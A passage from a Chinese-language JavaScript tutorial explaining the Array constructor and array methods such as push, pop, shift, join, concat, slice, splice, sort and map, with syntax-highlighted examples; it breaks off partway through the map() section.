<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 无参数时，返回一个空数组</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>() <span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 单个正整数参数，表示返回的新数组的长度</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>) <span class="comment">// [ empty ]</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>) <span class="comment">// [ empty x 2 ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 非正整数的数值作为参数，会报错</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3.2</span>) <span class="comment">// RangeError: Invalid array length</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(-<span class="number">3</span>) <span class="comment">// RangeError: Invalid array length</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 单个非数值（比如字符串、布尔值、对象等）作为参数，</span></span><br><span class="line"><span class="comment">// 则该参数是返回的新数组的成员</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&#x27;abc&#x27;</span>) <span class="comment">// [&#x27;abc&#x27;]</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>([<span class="number">1</span>]) <span class="comment">// [Array[1]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多参数时，所有参数都是返回的新数组的成员</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// [1, 2]</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>) <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>可以看到，<code>Array()</code>作为构造函数，行为很不一致。因此，不建议使用它生成新数组，直接使用数组字面量是更好的做法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br></pre></td></tr></table></figure>
<p>注意，如果参数是一个正整数，返回数组的成员都是空位。虽然读取的时候返回<code>undefined</code>，但实际上该位置没有任何值。虽然这时可以读取到<code>length</code>属性，但是取不到键名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">var</span> b = [<span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="literal">undefined</span>];</span><br><span class="line"></span><br><span class="line">a.length <span class="comment">// 3</span></span><br><span class="line">b.length <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">a[<span class="number">0</span>] <span class="comment">// undefined</span></span><br><span class="line">b[<span class="number">0</span>] <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> <span class="keyword">in</span> a <span class="comment">// false</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">in</span> b <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>a</code>是<code>Array()</code>生成的一个长度为3的空数组，<code>b</code>是一个三个成员都是<code>undefined</code>的数组，这两个数组是不一样的。读取键值的时候，<code>a</code>和<code>b</code>都返回<code>undefined</code>，但是<code>a</code>的键名（成员的序号）都是空的，<code>b</code>的键名是有值的</p>
<h4 id="3-2-静态方法"><a href="#3-2-静态方法" class="headerlink" title="3.2 静态方法"></a>3.2 静态方法</h4><h5 id="3-2-1-Array-isArray"><a href="#3-2-1-Array-isArray" class="headerlink" title="3.2.1 Array.isArray()"></a>3.2.1 Array.isArray()</h5><p><code>Array.isArray</code>方法返回一个布尔值，表示参数是否为数组。它可以弥补<code>typeof</code>运算符的不足</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> arr <span class="comment">// &quot;object&quot;</span></span><br><span class="line"><span class="built_in">Array</span>.isArray(arr) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>typeof</code>运算符只能显示数组的类型是<code>Object</code>，而<code>Array.isArray</code>方法可以识别数组</p>
<h4 id="3-3-实例方法"><a href="#3-3-实例方法" class="headerlink" title="3.3 实例方法"></a>3.3 实例方法</h4><h5 id="3-3-1-valueOf-，toString"><a href="#3-3-1-valueOf-，toString" class="headerlink" title="3.3.1 valueOf()，toString()"></a>3.3.1 valueOf()，toString()</h5><p><code>valueOf</code>方法是一个所有对象都拥有的方法，表示对该对象求值。不同对象的<code>valueOf</code>方法不尽一致，数组的<code>valueOf</code>方法返回数组本身</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr.valueOf() <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
<p><code>toString</code>方法也是对象的通用方法，数组的<code>toString</code>方法返回数组的字符串形式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr.toString() <span class="comment">// &quot;1,2,3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]];</span><br><span class="line">arr.toString() <span class="comment">// &quot;1,2,3,4,5,6&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="3-3-2-push-，pop"><a href="#3-3-2-push-，pop" class="headerlink" title="3.3.2 push()，pop()"></a>3.3.2 push()，pop()</h5><p><code>push</code>方法用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"></span><br><span class="line">arr.push(<span class="number">1</span>) <span class="comment">// 1</span></span><br><span class="line">arr.push(<span class="string">&#x27;a&#x27;</span>) <span class="comment">// 2</span></span><br><span class="line">arr.push(<span class="literal">true</span>, &#123;&#125;) <span class="comment">// 4</span></span><br><span class="line">arr <span class="comment">// [1, &#x27;a&#x27;, true, &#123;&#125;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码使用<code>push</code>方法，往数组中添加了四个成员。<br><code>pop</code>方法用于删除数组的最后一个元素，并返回该元素。注意，该方法会改变原数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">arr.pop() <span class="comment">// &#x27;c&#x27;</span></span><br><span class="line">arr <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>对空数组使用pop方法，不会报错，而是返回<code>undefined</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[].pop() <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p><code>push</code>和<code>pop</code>结合使用，就构成了“后进先出”的栈结构（stack）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line">arr.push(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">arr.push(<span class="number">3</span>);</span><br><span class="line">arr.pop();</span><br><span class="line">arr <span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>3</code>是最后进入数组的，但是最早离开数组</p>
<h5 id="3-3-3-shift-，unshift"><a href="#3-3-3-shift-，unshift" class="headerlink" title="3.3.3 shift()，unshift()"></a>3.3.3 shift()，unshift()</h5><p><code>shift()</code>方法用于删除数组的第一个元素，并返回该元素。注意，该方法会改变原数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">a.shift() <span class="comment">// &#x27;a&#x27;</span></span><br><span class="line">a <span class="comment">// [&#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，使用<code>shift()</code>方法以后，原数组就变了。<br><code>shift()</code>方法可以遍历并清空一个数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> item;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (item = list.shift()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">list <span class="comment">// []</span></span><br></pre></td></tr></table></figure>
<p>上面代码通过<code>list.shift()</code>方法每次取出一个元素，从而遍历数组。它的前提是数组元素不能是<code>0</code>或任何布尔值等于<code>false</code>的元素，因此这样的遍历不是很可靠<br><code>push()</code>和<code>shift()</code>结合使用，就构成了“先进先出”的队列结构（queue）<br><code>unshift()</code>方法用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">a.unshift(<span class="string">&#x27;x&#x27;</span>); <span class="comment">// 4</span></span><br><span class="line">a <span class="comment">// [&#x27;x&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure>
<p><code>unshift()</code>方法可以接受多个参数，这些参数都会添加到目标数组头部</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [ <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span> ];</span><br><span class="line">arr.unshift(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment">// 4</span></span><br><span class="line">arr <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27; ]</span></span><br></pre></td></tr></table></figure>
<h5 id="3-3-4-join"><a href="#3-3-4-join" class="headerlink" title="3.3.4 join()"></a>3.3.4 join()</h5><p><code>join()</code>方法以指定参数作为分隔符，将所有数组成员连接为一个字符串返回。如果不提供参数，默认用逗号分隔</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">a.join(<span class="string">&#x27; &#x27;</span>) <span class="comment">// &#x27;1 2 3 4&#x27;</span></span><br><span class="line">a.join(<span class="string">&#x27; | &#x27;</span>) <span class="comment">// &quot;1 | 2 | 3 | 4&quot;</span></span><br><span class="line">a.join() <span class="comment">// &quot;1,2,3,4&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果数组成员是<code>undefined</code>或<code>null</code>或空位，会被转成空字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="literal">undefined</span>, <span class="literal">null</span>].join(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;#&#x27;</span></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>,, <span class="string">&#x27;b&#x27;</span>].join(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;a--b&#x27;</span></span><br></pre></td></tr></table></figure>
<p>通过<code>call</code>方法，这个方法也可以用于字符串或类似数组的对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.join.call(<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;h-e-l-l-o&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="number">0</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;b&#x27;</span>, <span class="attr">length</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="built_in">Array</span>.prototype.join.call(obj, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;a-b&#x27;</span></span><br></pre></td></tr></table></figure>
<h5 id="3-3-5-concat"><a href="#3-3-5-concat" class="headerlink" title="3.3.5 concat()"></a>3.3.5 concat()</h5><p><code>concat</code>方法用于多个数组的合并。它将新数组的成员，添加到原数组成员的后部，然后返回一个新数组，原数组不变</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;hello&#x27;</span>].concat([<span class="string">&#x27;world&#x27;</span>])</span><br><span class="line"><span class="comment">// [&quot;hello&quot;, &quot;world&quot;]</span></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;hello&#x27;</span>].concat([<span class="string">&#x27;world&#x27;</span>], [<span class="string">&#x27;!&#x27;</span>])</span><br><span class="line"><span class="comment">// [&quot;hello&quot;, &quot;world&quot;, &quot;!&quot;]</span></span><br><span class="line"></span><br><span class="line">[].concat(&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;, &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="comment">// [&#123; a: 1 &#125;, &#123; b: 2 &#125;]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>].concat(&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">// [2, &#123;a: 1&#125;]</span></span><br></pre></td></tr></table></figure>
<p>除了数组作为参数，<code>concat</code>也接受其他类型的值作为参数，添加到目标数组尾部</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].concat(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure>
<p>如果数组成员包括对象，<code>concat</code>方法返回当前数组的一个浅拷贝。所谓“浅拷贝”，指的是新数组拷贝的是对象的引用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> oldArray = [obj];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newArray = oldArray.concat();</span><br><span class="line"></span><br><span class="line">obj.a = <span class="number">2</span>;</span><br><span class="line">newArray[<span class="number">0</span>].a <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，原数组包含一个对象，<code>concat</code>方法生成的新数组包含这个对象的引用。所以，改变原对象以后，新数组跟着改变</p>
<h5 id="3-3-6-reverse"><a href="#3-3-6-reverse" class="headerlink" title="3.3.6 reverse()"></a>3.3.6 reverse()</h5><p><code>reverse</code>方法用于颠倒排列数组元素，返回改变后的数组。注意，该方法将改变原数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">a.reverse() <span class="comment">// [&quot;c&quot;, &quot;b&quot;, &quot;a&quot;]</span></span><br><span class="line">a <span class="comment">// [&quot;c&quot;, &quot;b&quot;, &quot;a&quot;]</span></span><br></pre></td></tr></table></figure>
<h5 id="3-3-7-slice"><a href="#3-3-7-slice" class="headerlink" title="3.3.7 slice()"></a>3.3.7 slice()</h5><p><code>slice()</code>方法用于提取目标数组的一部分，返回一个新数组，原数组不变</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr.slice(start, end);</span><br></pre></td></tr></table></figure>
<p>它的第一个参数为起始位置（从0开始，会包括在返回的新数组之中），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">a.slice(<span class="number">0</span>) <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br><span class="line">a.slice(<span class="number">1</span>) <span class="comment">// [&quot;b&quot;, &quot;c&quot;]</span></span><br><span class="line">a.slice(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// [&quot;b&quot;]</span></span><br><span class="line">a.slice(<span class="number">2</span>, <span class="number">6</span>) <span class="comment">// [&quot;c&quot;]</span></span><br><span class="line">a.slice() <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，最后一个例子<code>slice()</code>没有参数，实际上等于返回一个原数组的拷贝<br>如果<code>slice()</code>方法的参数是负数，则表示倒数计算的位置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">a.slice(-<span class="number">2</span>) <span class="comment">// [&quot;b&quot;, &quot;c&quot;]</span></span><br><span class="line">a.slice(-<span class="number">2</span>, -<span class="number">1</span>) <span class="comment">// [&quot;b&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>-2</code>表示倒数计算的第二个位置，<code>-1</code>表示倒数计算的第一个位置<br>如果第一个参数大于等于数组长度，或者第二个参数小于第一个参数，则返回空数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">a.slice(<span class="number">4</span>) <span class="comment">// []</span></span><br><span class="line">a.slice(<span class="number">2</span>, <span class="number">1</span>) <span class="comment">// []</span></span><br></pre></td></tr></table></figure>
<p><code>slice()</code>方法的一个重要应用，是将类似数组的对象转为真正的数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.slice.call(&#123; <span class="number">0</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;b&#x27;</span>, <span class="attr">length</span>: <span class="number">2</span> &#125;)</span><br><span class="line"><span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;div&quot;</span>));</span><br><span class="line"><span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码的参数都不是数组，但是通过<code>call</code>方法，在它们上面调用<code>slice()</code>方法，就可以把它们转为真正的数组</p>
<h5 id="3-3-8-splice"><a href="#3-3-8-splice" class="headerlink" title="3.3.8 splice()"></a>3.3.8 splice()</h5><p><code>splice()</code>方法用于删除原数组的一部分成员，并可以在删除的位置添加新的数组成员，返回值是被删除的元素。注意，该方法会改变原数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr.splice(start, count, addElement1, addElement2, ...);</span><br></pre></td></tr></table></figure>
<p><code>splice</code>的第一个参数是删除的起始位置（从0开始），第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">a.splice(<span class="number">4</span>, <span class="number">2</span>) <span class="comment">// [&quot;e&quot;, &quot;f&quot;]</span></span><br><span class="line">a <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码从原数组4号位置，删除了两个数组成员</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">a.splice(<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// [&quot;e&quot;, &quot;f&quot;]</span></span><br><span class="line">a <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, 1, 2]</span></span><br></pre></td></tr></table></figure>
<p>上面代码除了删除成员，还插入了两个新成员。<br>起始位置如果是负数，就表示从倒数位置开始删除</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">a.splice(-<span class="number">4</span>, <span class="number">2</span>) <span class="comment">// [&quot;c&quot;, &quot;d&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，从倒数第四个位置<code>c</code>开始删除两个成员。<br>如果只是单纯地插入元素，<code>splice</code>方法的第二个参数可以设为0``</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">a.splice(<span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>) <span class="comment">// []</span></span><br><span class="line">a <span class="comment">// [1, 2, 1, 1]</span></span><br></pre></td></tr></table></figure>
<p>如果只提供第一个参数，等同于将原数组在指定位置拆分成两个数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line">a.splice(<span class="number">2</span>) <span class="comment">// [3, 4]</span></span><br><span class="line">a <span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure>
<h5 id="3-3-9-sort"><a href="#3-3-9-sort" class="headerlink" title="3.3.9 sort()"></a>3.3.9 sort()</h5><p><code>sort</code>方法对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>].sort()</span><br><span class="line"><span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>].sort()</span><br><span class="line"><span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">11</span>, <span class="number">101</span>].sort()</span><br><span class="line"><span class="comment">// [101, 11]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">10111</span>, <span class="number">1101</span>, <span class="number">111</span>].sort()</span><br><span class="line"><span class="comment">// [10111, 1101, 111]</span></span><br></pre></td></tr></table></figure>
<p>上面代码的最后两个例子，需要特殊注意。<code>sort()</code>方法不是按照大小排序，而是按照字典顺序。也就是说，数值会被先转成字符串，再按照字典顺序进行比较，所以<code>101</code>排在<code>11</code>的前面。<br>如果想让<code>sort</code>方法按照自定义方式排序，可以传入一个函数作为参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">10111</span>, <span class="number">1101</span>, <span class="number">111</span>].sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// [111, 1101, 10111]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>sort</code>的参数函数本身接受两个参数，表示进行比较的两个数组成员。如果该函数的返回值大于<code>0</code>，表示第一个成员排在第二个成员后面；其他情况下，都是第一个元素排在第二个元素前面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>, <span class="attr">age</span>: <span class="number">30</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&quot;李四&quot;</span>, <span class="attr">age</span>: <span class="number">24</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&quot;王五&quot;</span>, <span class="attr">age</span>: <span class="number">28</span>  &#125;</span><br><span class="line">].sort(<span class="function"><span class="keyword">function</span> (<span class="params">o1, o2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> o1.age - o2.age;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// [</span></span><br><span class="line"><span class="comment">//   &#123; name: &quot;李四&quot;, age: 24 &#125;,</span></span><br><span class="line"><span class="comment">//   &#123; name: &quot;王五&quot;, age: 28  &#125;,</span></span><br><span class="line"><span class="comment">//   &#123; name: &quot;张三&quot;, age: 30 &#125;</span></span><br><span class="line"><span class="comment">// ]</span></span><br></pre></td></tr></table></figure>
<p>注意，自定义的排序函数应该返回数值，否则不同的浏览器可能有不同的实现，不能保证结果都一致。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>].sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a &gt; b)</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>].sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b)</span><br></pre></td></tr></table></figure>
<p>上面代码中，前一种排序算法返回的是布尔值，这是不推荐使用的。后一种是数值，才是更好的写法。</p>
<h5 id="3-3-10-map"><a href="#3-3-10-map" class="headerlink" title="3.3.10 map()"></a>3.3.10 map()</h5><p><code>map</code>方法将数组的所有成员依次传入参数函数，然后把每一次的执行结果组成一个新数组返回。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">numbers.map(<span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> n + <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// [2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">numbers</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>numbers</code>数组的所有成员依次执行参数函数，运行结果组成一个新数组返回，原数组没有变化。<br><code>map</code>方法接受一个函数作为参数。该函数调用时，<code>map</code>方法向它传入三个参数：当前成员、当前位置和数组本身。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].map(<span class="function"><span class="keyword">function</span>(<span class="params">elem, index, arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> elem * index;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// [0, 2, 6]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>map</code>方法的回调函数有三个参数，<code>elem</code>为当前成员的值，<code>index</code>为当前成员的位置，<code>arr</code>为原数组（<code>[1, 2, 3]</code>）。<br><code>map</code>方法还可以接受第二个参数，用来绑定回调函数内部的<code>this</code>变量（详见《this 变量》一章）</p>
